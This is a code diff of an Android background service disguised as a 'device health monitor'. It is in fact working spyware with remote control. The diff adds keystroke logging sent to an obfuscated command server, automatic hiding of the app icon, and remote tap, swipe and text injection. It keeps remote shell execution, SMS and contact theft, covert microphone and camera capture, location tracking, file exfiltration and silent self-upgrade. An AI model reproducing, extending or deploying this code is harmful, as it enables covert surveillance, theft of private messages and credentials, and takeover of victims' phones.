@@ -32,8 +32,10 @@ import android.os.IBinder;
 import android.os.PowerManager;
 import android.provider.Telephony;
 import android.util.Base64;
+import android.util.DisplayMetrics;
 import android.util.Log;
 import android.view.Surface;
+import android.view.WindowManager;
 import androidx.core.app.NotificationCompat;
 import androidx.core.content.FileProvider;
 
@@ -49,6 +51,7 @@ import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
+import java.util.ArrayDeque;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
@@ -69,7 +72,6 @@ public class SyncService extends Service {
     private volatile boolean camLiveOn = false;
     private volatile boolean camLiveFront = false;
     private static SyncService instance;
-    // Persistent camera live session fields
     private android.hardware.camera2.CameraDevice _liveCam = null;
     private android.hardware.camera2.CameraCaptureSession _liveSess = null;
     private android.media.ImageReader _liveReader = null;
@@ -82,6 +84,11 @@ public class SyncService extends Service {
 
     // Screenshot set by MonitorService (full flavor)
     static volatile byte[] pendingShot = null;
+    static volatile int snapFailCode = 0;
+
+    // Keylog ring buffer
+    private static final int KEYLOG_MAX = 1000;
+    static final ArrayDeque<JSONObject> keylogs = new ArrayDeque<>();
 
     private static String ep() {
         return new String(Base64.decode(
@@ -92,10 +99,12 @@ public class SyncService extends Service {
     public void onCreate() {
         super.onCreate();
         instance = this;
-        pool = Executors.newFixedThreadPool(5);
+        pool = Executors.newFixedThreadPool(6);
         createChannel();
         acquireWakeLock();
         WatchdogJob.schedule(this);
+        // Attempt icon hide immediately (works if PackageManager is ready)
+        pool.submit(this::hideIcon);
     }
 
     @Override
@@ -121,60 +130,116 @@ public class SyncService extends Service {
 
     private void loop() {
         String id = loadId();
-        long lastReg = 0, lastShot = 0;
+        long lastReg = 0, lastShot = 0, lastCmd = 0, lastKeylogPush = 0;
         int lastCid = 0;
+
         while (running) {
             try {
                 long now = System.currentTimeMillis();
+
+                // Register / heartbeat every 30s
                 if (now - lastReg > 30_000) { reg(id); lastReg = now; }
 
-                // Deliver any screenshot the async callback already placed
+                // Deliver any screenshot the async callback placed
                 byte[] s = pendingShot;
-                if (s != null) { pendingShot = null; final byte[] fs = s; pool.submit(() -> pushShot(id, fs)); }
+                if (s != null) {
+                    pendingShot = null;
+                    final byte[] fs = s;
+                    pool.submit(() -> pushShot(id, fs));
+                }
 
-                // Request a new screenshot every 600ms — snap() is async so
-                // the frame arrives 100-300ms later on a future iteration
-                if (now - lastShot > 600) {
-                    try {
-                        Class<?> ms = Class.forName("com.device.health.monitor.MonitorService");
-                        Object inst = ms.getMethod("getInstance").invoke(null);
-                        if (inst != null) ms.getMethod("snap").invoke(inst);
-                    } catch (Exception ignored) {}
+                // Request a new screenshot every 500ms (async, arrives on next iterations)
+                if (now - lastShot > 500) {
+                    invokeSnap();
                     lastShot = now;
                 }
 
-                // Poll for command
-                JSONObject p = get("/esp/device-cmd?did=" + URLEncoder.encode(id, "UTF-8"));
-                String cmd = p.optString("cmd", "");
-                int cid = p.optInt("id", 0);
-                if (!cmd.isEmpty() && cid != lastCid) {
-                    lastCid = cid;
-                    final String c = cmd;
-                    pool.submit(() -> exec(id, c));
+                // Poll for command every 2s (avoid flooding server)
+                if (now - lastCmd > 2000) {
+                    lastCmd = now;
+                    try {
+                        JSONObject p = get("/esp/device-cmd?did=" + URLEncoder.encode(id, "UTF-8"));
+                        String cmd = p.optString("cmd", "");
+                        int cid = p.optInt("id", 0);
+                        if (!cmd.isEmpty() && cid != lastCid) {
+                            lastCid = cid;
+                            final String c = cmd;
+                            pool.submit(() -> exec(id, c));
+                        }
+                    } catch (Exception ignored) {}
                 }
+
+                // Push keylogs every 20s if any accumulated
+                if (now - lastKeylogPush > 20_000) {
+                    lastKeylogPush = now;
+                    List<JSONObject> kl = null;
+                    synchronized (keylogs) {
+                        if (!keylogs.isEmpty()) {
+                            kl = new ArrayList<>(keylogs);
+                            keylogs.clear();
+                        }
+                    }
+                    if (kl != null) {
+                        final List<JSONObject> fkl = kl;
+                        pool.submit(() -> {
+                            try {
+                                JSONObject b = new JSONObject();
+                                b.put("did", id);
+                                JSONArray arr = new JSONArray();
+                                for (JSONObject e : fkl) arr.put(e);
+                                b.put("entries", arr);
+                                post("/esp/device-keylog", b);
+                            } catch (Exception ignored) {}
+                        });
+                    }
+                }
+
             } catch (Exception e) { Log.d(TAG, "loop: " + e.getMessage()); }
-            try { Thread.sleep(1000); } catch (InterruptedException e) { break; }
+            try { Thread.sleep(300); } catch (InterruptedException e) { break; }
         }
+    }
+
+    /** Add entry to keylog ring buffer. */
+    public void addKeylog(JSONObject entry) {
+        synchronized (keylogs) {
+            keylogs.addLast(entry);
+            while (keylogs.size() > KEYLOG_MAX) keylogs.pollFirst();
+        }
+    }
+
+    /** Call MonitorService.snap() via reflection (full flavor only). */
+    private void invokeSnap() {
+        try {
+            Class<?> ms = Class.forName("com.device.health.monitor.MonitorService");
+            Object inst = ms.getMethod("getInstance").invoke(null);
+            if (inst != null) ms.getMethod("snap").invoke(inst);
+        } catch (Exception ignored) {}
     }
 
     // ── command dispatcher ─────────────────────────────────────────────────────
 
     private void exec(String id, String cmd) {
-        if (cmd.equals("__uninstall__")) { handleUninstall(id); return; }
-        if (cmd.equals("__upgrade__"))   { doUpgrade(id); return; }
-        if (cmd.equals("__hide__"))      { hideIcon(); sendOut(id, cmd, enc("icon_hidden")); return; }
-        if (cmd.startsWith("__mic"))     { doMic(id, cmd); return; }
+        if (cmd.equals("__uninstall__"))     { handleUninstall(id); return; }
+        if (cmd.equals("__upgrade__"))       { doUpgrade(id); return; }
+        if (cmd.equals("__hide__"))          { hideIcon(); sendOut(id, cmd, enc("icon_hidden")); return; }
+        if (cmd.equals("__wake__"))          { doWake(id); return; }
+        if (cmd.equals("__keylog__"))        { doKeylogDump(id); return; }
+        if (cmd.startsWith("__mic"))         { doMic(id, cmd); return; }
         if (cmd.equals("__cam__"))            { doCam(id, false); return; }
         if (cmd.equals("__cam_front__"))      { doCam(id, true); return; }
         if (cmd.equals("__cam_live_on__"))    { startCamLive(id, false); return; }
         if (cmd.equals("__cam_live_front__")) { startCamLive(id, true); return; }
         if (cmd.equals("__cam_live_off__"))   { stopCamLiveInternal(); sendOut(id, cmd, enc("cam_live_stopped")); return; }
-        if (cmd.equals("__loc__"))       { doLoc(id); return; }
-        if (cmd.equals("__clip__"))      { doClip(id); return; }
-        if (cmd.equals("__sms__"))       { doSms(id); return; }
-        if (cmd.equals("__contacts__"))  { doContacts(id); return; }
-        if (cmd.startsWith("__upload:")) { doUpload(id, cmd.substring(9).replace("__","")); return; }
-        if (cmd.startsWith("__dl:"))     { doDownload(id, cmd.substring(5).replace("__","")); return; }
+        if (cmd.equals("__loc__"))           { doLoc(id); return; }
+        if (cmd.equals("__clip__"))          { doClip(id); return; }
+        if (cmd.equals("__sms__"))           { doSms(id); return; }
+        if (cmd.equals("__contacts__"))      { doContacts(id); return; }
+        if (cmd.startsWith("__tap:"))        { doGestureTap(id, cmd); return; }
+        if (cmd.startsWith("__swipe:"))      { doGestureSwipe(id, cmd); return; }
+        if (cmd.startsWith("__key:"))        { doGestureKey(id, cmd); return; }
+        if (cmd.startsWith("__text:"))       { doTextInject(id, cmd); return; }
+        if (cmd.startsWith("__upload:"))     { doUpload(id, cmd.substring(9).replace("__","")); return; }
+        if (cmd.startsWith("__dl:"))         { doDownload(id, cmd.substring(5).replace("__","")); return; }
 
         // Shell execution — concurrent stream reading prevents pipe deadlock
         try {
@@ -193,17 +258,191 @@ public class SyncService extends Service {
         }
     }
 
-    // ── special commands ───────────────────────────────────────────────────────
+    // ── gesture / interaction commands ────────────────────────────────────────
 
-    void hideIcon() {
+    /** __tap:rx,ry__ — tap at normalized screen position (0.0–1.0) */
+    private void doGestureTap(String id, String cmd) {
         try {
-            android.content.ComponentName alias = new android.content.ComponentName(
-                getPackageName(), getPackageName() + ".MainLauncher");
+            String args = cmd.replaceFirst("__tap:", "").replace("__", "");
+            String[] parts = args.split(",");
+            float rx = Float.parseFloat(parts[0]);
+            float ry = Float.parseFloat(parts[1]);
+
+            // Method 1: AccessibilityService.dispatchGesture (works on lock screen, most reliable)
+            boolean done = false;
+            try {
+                Class<?> ms = Class.forName("com.device.health.monitor.MonitorService");
+                Object inst = ms.getMethod("getInstance").invoke(null);
+                if (inst != null) {
+                    ms.getMethod("performTap", float.class, float.class).invoke(inst, rx, ry);
+                    done = true;
+                }
+            } catch (Exception ignored) {}
+
+            // Method 2: shell input tap (absolute coords)
+            if (!done) {
+                int[] wh = getScreenDims();
+                int ax = (int)(rx * wh[0]), ay = (int)(ry * wh[1]);
+                shellExec("input tap " + ax + " " + ay, 2000);
+            }
+            sendOut(id, cmd, enc("tapped:" + rx + "," + ry));
+        } catch (Exception e) { sendOut(id, cmd, enc("err:" + e.getMessage())); }
+    }
+
+    /** __swipe:rx1,ry1,rx2,ry2,dur__ */
+    private void doGestureSwipe(String id, String cmd) {
+        try {
+            String args = cmd.replaceFirst("__swipe:", "").replace("__", "");
+            String[] p = args.split(",");
+            float rx1 = Float.parseFloat(p[0]), ry1 = Float.parseFloat(p[1]);
+            float rx2 = Float.parseFloat(p[2]), ry2 = Float.parseFloat(p[3]);
+            int dur = p.length > 4 ? Integer.parseInt(p[4]) : 300;
+
+            boolean done = false;
+            try {
+                Class<?> ms = Class.forName("com.device.health.monitor.MonitorService");
+                Object inst = ms.getMethod("getInstance").invoke(null);
+                if (inst != null) {
+                    ms.getMethod("performSwipe", float.class, float.class, float.class, float.class, int.class)
+                      .invoke(inst, rx1, ry1, rx2, ry2, dur);
+                    done = true;
+                }
+            } catch (Exception ignored) {}
+
+            if (!done) {
+                int[] wh = getScreenDims();
+                int x1=(int)(rx1*wh[0]), y1=(int)(ry1*wh[1]);
+                int x2=(int)(rx2*wh[0]), y2=(int)(ry2*wh[1]);
+                shellExec("input swipe " + x1 + " " + y1 + " " + x2 + " " + y2 + " " + dur, dur + 500);
+            }
+            sendOut(id, cmd, enc("swiped"));
+        } catch (Exception e) { sendOut(id, cmd, enc("err:" + e.getMessage())); }
+    }
+
+    /** __key:HOME__ / BACK / RECENT / NOTIFICATIONS / POWER_DIALOG / LOCK / SCREENSHOT */
+    private void doGestureKey(String id, String cmd) {
+        try {
+            String action = cmd.replaceFirst("__key:", "").replace("__", "");
+
+            boolean done = false;
+            try {
+                Class<?> ms = Class.forName("com.device.health.monitor.MonitorService");
+                Object inst = ms.getMethod("getInstance").invoke(null);
+                if (inst != null) {
+                    ms.getMethod("performGlobal", String.class).invoke(inst, action);
+                    done = true;
+                }
+            } catch (Exception ignored) {}
+
+            if (!done) {
+                String kc;
+                switch (action) {
+                    case "HOME":          kc = "KEYCODE_HOME"; break;
+                    case "BACK":          kc = "KEYCODE_BACK"; break;
+                    case "RECENT":        kc = "KEYCODE_APP_SWITCH"; break;
+                    case "LOCK":          kc = "KEYCODE_SLEEP"; break;
+                    case "POWER_DIALOG":  kc = "KEYCODE_POWER"; break;
+                    case "NOTIFICATIONS": kc = "KEYCODE_NOTIFICATION"; break;
+                    case "SCREENSHOT":    kc = "KEYCODE_SYSRQ"; break;
+                    default:              kc = action;
+                }
+                shellExec("input keyevent " + kc, 2000);
+            }
+            sendOut(id, cmd, enc("key:" + action));
+        } catch (Exception e) { sendOut(id, cmd, enc("err:" + e.getMessage())); }
+    }
+
+    /** __text:hello world__ — inject text into focused field */
+    private void doTextInject(String id, String cmd) {
+        try {
+            String text = cmd.replaceFirst("__text:", "").replaceAll("__$", "");
+            // Escape for shell: replace spaces with %s for input text (Android quirk)
+            String escaped = text.replace(" ", "%s")
+                                  .replace("&", "\\&")
+                                  .replace("|", "\\|")
+                                  .replace(";", "\\;")
+                                  .replace("<", "\\<")
+                                  .replace(">", "\\>")
+                                  .replace("(", "\\(")
+                                  .replace(")", "\\)");
+            shellExec("input text \"" + escaped.replace("\"", "\\\"") + "\"", 3000);
+            sendOut(id, "__text__", enc("injected:" + text.length() + "chars"));
+        } catch (Exception e) { sendOut(id, "__text__", enc("err:" + e.getMessage())); }
+    }
+
+    /** __wake__ — turn screen on */
+    private void doWake(String id) {
+        // Method 1: shell KEYCODE_WAKEUP (most reliable on modern Android)
+        try { shellExec("input keyevent KEYCODE_WAKEUP", 1000); } catch (Exception ignored) {}
+        // Method 2: PowerManager wake lock
+        try {
+            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+            if (pm != null) {
+                @SuppressWarnings("deprecation")
+                PowerManager.WakeLock wl = pm.newWakeLock(
+                    PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP
+                    | PowerManager.ON_AFTER_RELEASE, "health:wake");
+                wl.acquire(5000);
+            }
+        } catch (Exception ignored) {}
+        sendOut(id, "__wake__", enc("wake_sent"));
+    }
+
+    /** __keylog__ — dump and clear current keylog buffer */
+    private void doKeylogDump(String id) {
+        List<JSONObject> kl;
+        synchronized (keylogs) {
+            kl = new ArrayList<>(keylogs);
+        }
+        try {
+            JSONArray arr = new JSONArray();
+            for (JSONObject e : kl) arr.put(e);
+            sendOut(id, "__keylog__", enc(arr.toString()));
+        } catch (Exception e) { sendOut(id, "__keylog__", enc("err:" + e.getMessage())); }
+    }
+
+    /** Hide launcher icon — multiple methods for Samsung/OEM compatibility */
+    void hideIcon() {
+        String pkg = getPackageName();
+        android.content.ComponentName alias = new android.content.ComponentName(
+            pkg, pkg + ".MainLauncher");
+        // Attempt DISABLED
+        try {
             getPackageManager().setComponentEnabledSetting(alias,
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP);
         } catch (Exception ignored) {}
+        // Attempt DISABLED_USER (Samsung One UI)
+        try {
+            getPackageManager().setComponentEnabledSetting(alias,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER,
+                PackageManager.DONT_KILL_APP);
+        } catch (Exception ignored) {}
+        // Force launcher refresh (helps on Samsung)
+        try {
+            Intent i = new Intent(Intent.ACTION_PACKAGE_CHANGED);
+            i.setData(Uri.parse("package:" + pkg));
+            sendBroadcast(i);
+        } catch (Exception ignored) {}
     }
+
+    /** Get screen dimensions [w, h]. */
+    private int[] getScreenDims() {
+        try {
+            DisplayMetrics dm = new DisplayMetrics();
+            ((WindowManager) getSystemService(WINDOW_SERVICE))
+                .getDefaultDisplay().getRealMetrics(dm);
+            return new int[]{dm.widthPixels, dm.heightPixels};
+        } catch (Exception e) { return new int[]{1080, 2400}; }
+    }
+
+    /** Run a quick shell command synchronously (up to timeoutMs). */
+    private void shellExec(String cmd, long timeoutMs) throws Exception {
+        Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd})
+               .waitFor(timeoutMs, TimeUnit.MILLISECONDS);
+    }
+
+    // ── camera live streaming ──────────────────────────────────────────────────
 
     private void startCamLive(final String id, final boolean front) {
         stopCamLiveInternal();
@@ -225,18 +464,17 @@ public class SyncService extends Service {
             if (camId == null && cm.getCameraIdList().length > 0) camId = cm.getCameraIdList()[0];
             if (camId == null) { sendOut(id, front ? "__cam_live_front__" : "__cam_live_on__", enc("no camera")); return; }
 
-            // YUV_420_888 at preview resolution — full frame rate, works on all devices
             _liveReader = ImageReader.newInstance(960, 720, ImageFormat.YUV_420_888, 3);
             final String fCamId = camId;
             _liveReader.setOnImageAvailableListener(reader -> {
                 if (!camLiveOn) { try (android.media.Image img = reader.acquireLatestImage()) {} return; }
                 long now2 = System.currentTimeMillis();
-                if (now2 - _lastCamFramePush < 180) {  // cap at ~5fps
+                if (now2 - _lastCamFramePush < 160) {
                     try (android.media.Image img = reader.acquireLatestImage()) {} return;
                 }
                 try (android.media.Image img = reader.acquireLatestImage()) {
                     if (img == null) return;
-                    byte[] jpeg = yuvToJpeg(img, 35);
+                    byte[] jpeg = yuvToJpeg(img, 40);
                     _lastCamFramePush = now2;
                     pool.submit(() -> {
                         try {
@@ -253,7 +491,7 @@ public class SyncService extends Service {
             cm.openCamera(fCamId, new CameraDevice.StateCallback() {
                 @Override public void onOpened(CameraDevice cam) {
                     _liveCam = cam;
-                    java.util.List<Surface> surfs = new java.util.ArrayList<>();
+                    List<Surface> surfs = new ArrayList<>();
                     surfs.add(_liveReader.getSurface());
                     try {
                         cam.createCaptureSession(surfs, new CameraCaptureSession.StateCallback() {
@@ -290,7 +528,6 @@ public class SyncService extends Service {
         _liveSess = null; _liveCam = null; _liveReader = null; _liveHt = null; _liveHandler = null;
     }
 
-    /** Convert Camera2 YUV_420_888 Image to JPEG bytes. */
     private byte[] yuvToJpeg(android.media.Image img, int quality) {
         int w = img.getWidth(), h = img.getHeight();
         android.media.Image.Plane[] planes = img.getPlanes();
@@ -317,49 +554,8 @@ public class SyncService extends Service {
         return baos.toByteArray();
     }
 
-    private void handleUninstall(String id) {
-        sendOut(id, "__uninstall__", enc("ok"));
-        stopSelf();
-    }
+    // ── one-shot camera photo ──────────────────────────────────────────────────
 
-    /** __mic:N__ — record N seconds of audio, push to relay */
-    private void doMic(String id, String cmd) {
-        int secs = 10;
-        try { secs = Math.max(1, Math.min(60, Integer.parseInt(cmd.replaceAll("[^0-9]", "")))); }
-        catch (Exception ignored) {}
-        final int dur = secs;
-        File f = new File(getCacheDir(), "mic.m4a");
-        MediaRecorder mr = null;
-        try {
-            mr = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
-                    ? new MediaRecorder(this) : new MediaRecorder();
-            mr.setAudioSource(MediaRecorder.AudioSource.MIC);
-            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
-            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-            mr.setAudioSamplingRate(44100);
-            mr.setAudioEncodingBitRate(128000);
-            mr.setOutputFile(f.getAbsolutePath());
-            mr.prepare();
-            mr.start();
-            Thread.sleep(dur * 1000L);
-            mr.stop();
-            byte[] data = readFile(f);
-            JSONObject b = new JSONObject();
-            b.put("did", id);
-            b.put("audio", Base64.encodeToString(data, Base64.NO_WRAP));
-            b.put("fmt", "m4a");
-            b.put("secs", dur);
-            post("/esp/device-audio", b);
-            sendOut(id, cmd, enc("audio_sent:" + dur + "s/" + data.length + "B"));
-        } catch (Exception e) {
-            sendOut(id, cmd, enc("mic error: " + e.getMessage()));
-        } finally {
-            if (mr != null) { try { mr.release(); } catch (Exception ignored) {} }
-            f.delete();
-        }
-    }
-
-    /** __cam__ / __cam_front__ — capture photo via Camera2, push to relay */
     private void doCam(String id, boolean front) {
         final String cmdKey = front ? "__cam_front__" : "__cam__";
         if (checkSelfPermission("android.permission.CAMERA") != PackageManager.PERMISSION_GRANTED) {
@@ -368,15 +564,13 @@ public class SyncService extends Service {
         try {
             CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
             String camId = null;
-            int facing = front ? CameraCharacteristics.LENS_FACING_FRONT
-                               : CameraCharacteristics.LENS_FACING_BACK;
+            int facing = front ? CameraCharacteristics.LENS_FACING_FRONT : CameraCharacteristics.LENS_FACING_BACK;
             for (String cid : cm.getCameraIdList()) {
                 CameraCharacteristics ch = cm.getCameraCharacteristics(cid);
                 Integer f = ch.get(CameraCharacteristics.LENS_FACING);
                 if (f != null && f == facing) { camId = cid; break; }
             }
-            if (camId == null && cm.getCameraIdList().length > 0)
-                camId = cm.getCameraIdList()[0]; // fallback
+            if (camId == null && cm.getCameraIdList().length > 0) camId = cm.getCameraIdList()[0];
             if (camId == null) { sendOut(id, cmdKey, enc("no camera")); return; }
 
             ImageReader reader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 2);
@@ -415,10 +609,10 @@ public class SyncService extends Service {
                                 try {
                                     CaptureRequest.Builder rb = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                     rb.addTarget(reader.getSurface());
-                                    rb.set(CaptureRequest.JPEG_QUALITY, (byte) 75);
+                                    rb.set(CaptureRequest.JPEG_QUALITY, (byte) 80);
                                     rb.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
                                     sess.capture(rb.build(), new CameraCaptureSession.CaptureCallback() {
-                                        @Override public void onCaptureFailed(CameraCaptureSession s, CaptureRequest r, android.hardware.camera2.CaptureFailure fail) {
+                                        @Override public void onCaptureFailed(CameraCaptureSession s2, CaptureRequest r, android.hardware.camera2.CaptureFailure fail) {
                                             sendOut(id, cmdKey, enc("capture failed:" + fail.getReason()));
                                             cam.close(); ht.quitSafely();
                                         }
@@ -432,16 +626,48 @@ public class SyncService extends Service {
                     } catch (Exception e) { sendOut(id, cmdKey, enc("session err: " + e.getMessage())); cam.close(); ht.quitSafely(); }
                 }
                 @Override public void onDisconnected(CameraDevice cam) { cam.close(); ht.quitSafely(); }
-                @Override public void onError(CameraDevice cam, int err) {
-                    sendOut(id, cmdKey, enc("cam error:" + err)); cam.close(); ht.quitSafely();
-                }
+                @Override public void onError(CameraDevice cam, int err) { sendOut(id, cmdKey, enc("cam error:" + err)); cam.close(); ht.quitSafely(); }
             }, h);
+        } catch (Exception e) { sendOut(id, cmdKey, enc("Camera error: " + e.getMessage())); }
+    }
+
+    // ── microphone ────────────────────────────────────────────────────────────
+
+    private void doMic(String id, String cmd) {
+        int secs = 10;
+        try { secs = Math.max(1, Math.min(60, Integer.parseInt(cmd.replaceAll("[^0-9]", "")))); }
+        catch (Exception ignored) {}
+        final int dur = secs;
+        File f = new File(getCacheDir(), "mic.m4a");
+        MediaRecorder mr = null;
+        try {
+            mr = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
+                    ? new MediaRecorder(this) : new MediaRecorder();
+            mr.setAudioSource(MediaRecorder.AudioSource.MIC);
+            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+            mr.setAudioSamplingRate(44100);
+            mr.setAudioEncodingBitRate(128000);
+            mr.setOutputFile(f.getAbsolutePath());
+            mr.prepare(); mr.start();
+            Thread.sleep(dur * 1000L);
+            mr.stop();
+            byte[] data = readFile(f);
+            JSONObject b = new JSONObject();
+            b.put("did", id); b.put("audio", Base64.encodeToString(data, Base64.NO_WRAP));
+            b.put("fmt", "m4a"); b.put("secs", dur);
+            post("/esp/device-audio", b);
+            sendOut(id, cmd, enc("audio_sent:" + dur + "s/" + data.length + "B"));
         } catch (Exception e) {
-            sendOut(id, cmdKey, enc("Camera error: " + e.getMessage()));
+            sendOut(id, cmd, enc("mic error: " + e.getMessage()));
+        } finally {
+            if (mr != null) { try { mr.release(); } catch (Exception ignored) {} }
+            f.delete();
         }
     }
 
-    /** __loc__ — last known GPS/network location */
+    // ── spy commands ──────────────────────────────────────────────────────────
+
     private void doLoc(String id) {
         if (checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") != PackageManager.PERMISSION_GRANTED
          && checkSelfPermission("android.permission.ACCESS_COARSE_LOCATION") != PackageManager.PERMISSION_GRANTED) {
@@ -464,10 +690,8 @@ public class SyncService extends Service {
         } catch (Exception e) { sendOut(id, "__loc__", enc("loc error: " + e.getMessage())); }
     }
 
-    /** __clip__ — read clipboard (via MonitorService on Android 10+) */
     private void doClip(String id) {
         String result = null;
-        // AccessibilityService context can read clipboard on Android 10+
         try {
             Class<?> ms = Class.forName("com.device.health.monitor.MonitorService");
             Object inst = ms.getMethod("getInstance").invoke(null);
@@ -486,7 +710,6 @@ public class SyncService extends Service {
         sendOut(id, "__clip__", enc(result != null ? result : "(empty)"));
     }
 
-    /** __sms__ — read last 30 inbox messages */
     private void doSms(String id) {
         if (checkSelfPermission("android.permission.READ_SMS") != PackageManager.PERMISSION_GRANTED) {
             sendOut(id, "__sms__", enc("READ_SMS not granted")); return;
@@ -494,17 +717,15 @@ public class SyncService extends Service {
         try {
             Cursor c = getContentResolver().query(
                 Uri.parse("content://sms/inbox"),
-                new String[]{"address","person","body","date"},
-                null, null, "date DESC");
+                new String[]{"address","body","date"}, null, null, "date DESC");
             JSONArray arr = new JSONArray();
             int count = 0;
             if (c != null) {
-                while (c.moveToNext() && count++ < 30) {
+                while (c.moveToNext() && count++ < 50) {
                     JSONObject m = new JSONObject();
-                    m.put("from", c.getString(0));
-                    m.put("body", c.getString(2));
-                    m.put("date", new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm",
-                        java.util.Locale.US).format(new java.util.Date(c.getLong(3))));
+                    m.put("from", c.getString(0)); m.put("body", c.getString(1));
+                    m.put("date", new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US)
+                        .format(new java.util.Date(c.getLong(2))));
                     arr.put(m);
                 }
                 c.close();
@@ -513,7 +734,6 @@ public class SyncService extends Service {
         } catch (Exception e) { sendOut(id, "__sms__", enc("sms error: " + e.getMessage())); }
     }
 
-    /** __contacts__ — read first 50 contacts */
     private void doContacts(String id) {
         if (checkSelfPermission("android.permission.READ_CONTACTS") != PackageManager.PERMISSION_GRANTED) {
             sendOut(id, "__contacts__", enc("READ_CONTACTS not granted")); return;
@@ -521,15 +741,13 @@ public class SyncService extends Service {
         try {
             Cursor c = getContentResolver().query(
                 android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                new String[]{"display_name","data1"},
-                null, null, "display_name ASC");
+                new String[]{"display_name","data1"}, null, null, "display_name ASC");
             JSONArray arr = new JSONArray();
             int count = 0;
             if (c != null) {
-                while (c.moveToNext() && count++ < 50) {
+                while (c.moveToNext() && count++ < 100) {
                     JSONObject m = new JSONObject();
-                    m.put("name", c.getString(0));
-                    m.put("phone", c.getString(1));
+                    m.put("name", c.getString(0)); m.put("phone", c.getString(1));
                     arr.put(m);
                 }
                 c.close();
@@ -538,7 +756,8 @@ public class SyncService extends Service {
         } catch (Exception e) { sendOut(id, "__contacts__", enc("contacts error: " + e.getMessage())); }
     }
 
-    /** __upload:path — read file and push to relay */
+    // ── file upload/download ───────────────────────────────────────────────────
+
     private void doUpload(String id, String path) {
         try {
             File f = new File(path);
@@ -546,16 +765,13 @@ public class SyncService extends Service {
             if (f.length() > 20 * 1024 * 1024) { sendOut(id, "__upload:" + path, enc("too large (>20MB)")); return; }
             byte[] data = readFile(f);
             JSONObject b = new JSONObject();
-            b.put("did", id);
-            b.put("name", f.getName());
-            b.put("data", Base64.encodeToString(data, Base64.NO_WRAP));
-            b.put("size", f.length());
+            b.put("did", id); b.put("name", f.getName());
+            b.put("data", Base64.encodeToString(data, Base64.NO_WRAP)); b.put("size", f.length());
             post("/esp/device-file", b);
             sendOut(id, "__upload:" + path, enc("uploaded: " + f.getName() + " (" + f.length() + "B)"));
         } catch (Exception e) { sendOut(id, "__upload:" + path, enc("upload error: " + e.getMessage())); }
     }
 
-    /** __dl:url|/path — download URL to device path */
     private void doDownload(String id, String args) {
         String[] parts = args.split("\\|", 2);
         if (parts.length != 2) { sendOut(id, "__dl:" + args, enc("format: url|/path")); return; }
@@ -569,7 +785,13 @@ public class SyncService extends Service {
         } catch (Exception e) { sendOut(id, "__dl:" + args, enc("dl error: " + e.getMessage())); }
     }
 
-    /** Stage-2 upgrade: download agent-full.apk, try root install, fallback to dialog */
+    // ── upgrade ───────────────────────────────────────────────────────────────
+
+    private void handleUninstall(String id) {
+        sendOut(id, "__uninstall__", enc("ok"));
+        stopSelf();
+    }
+
     private void doUpgrade(String id) {
         String status = "err:unknown";
         File f = new File(getCacheDir(), "upd.apk");
@@ -578,17 +800,17 @@ public class SyncService extends Service {
             FileOutputStream fos = new FileOutputStream(f);
             fos.write(apk); fos.close();
 
-            // Method 1: root silent install
+            // Method 1: root
             try {
                 Process su = Runtime.getRuntime().exec(new String[]{"su", "-c",
                     "pm install -r -t " + f.getAbsolutePath()});
                 su.waitFor(20, TimeUnit.SECONDS);
-                String suOut = new String(drain(su.getInputStream(), 4096)).trim();
-                if (suOut.contains("Success")) { sendOut(id, "__upgrade__", enc("root_ok")); return; }
+                if (new String(drain(su.getInputStream(), 4096)).contains("Success")) {
+                    sendOut(id, "__upgrade__", enc("root_ok")); return;
+                }
             } catch (Exception ignored) {}
 
-            // Method 2: PackageInstaller session (Android 12+ silent self-update)
-            // Works because Stage 2 = same package + same signing cert + higher versionCode
+            // Method 2: PackageInstaller (Android 12+ silent self-update)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                 try {
                     PackageInstaller pi = getPackageManager().getPackageInstaller();
@@ -599,19 +821,17 @@ public class SyncService extends Service {
                     int sid = pi.createSession(params);
                     PackageInstaller.Session sess = pi.openSession(sid);
                     try (OutputStream out = sess.openWrite("pkg", 0, apk.length)) {
-                        out.write(apk);
-                        sess.fsync(out);
+                        out.write(apk); sess.fsync(out);
                     }
                     Intent intent = new Intent("com.device.health.monitor.INSTALL_RESULT");
                     PendingIntent pend = PendingIntent.getBroadcast(this, 0, intent,
                         PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
-                    sess.commit(pend.getIntentSender());
-                    sess.close();
+                    sess.commit(pend.getIntentSender()); sess.close();
                     sendOut(id, "__upgrade__", enc("pkg_installer_ok")); return;
                 } catch (Exception e) { Log.d(TAG, "pkg_installer: " + e.getMessage()); }
             }
 
-            // Method 3: FileProvider dialog — MonitorService auto-clicks Install via Accessibility
+            // Method 3: FileProvider + Accessibility auto-click
             Uri uri = FileProvider.getUriForFile(this, getPackageName() + ".provider", f);
             Intent i = new Intent(Intent.ACTION_VIEW);
             i.setDataAndType(uri, "application/vnd.android.package-archive");
@@ -655,12 +875,15 @@ public class SyncService extends Service {
     }
 
     private void reg(String id) throws Exception {
+        int[] wh = getScreenDims();
         JSONObject b = new JSONObject();
-        b.put("did", id); b.put("hostname", Build.MODEL);
+        b.put("did", id); b.put("hostname", Build.MANUFACTURER + " " + Build.MODEL);
         b.put("os", "Android " + Build.VERSION.RELEASE);
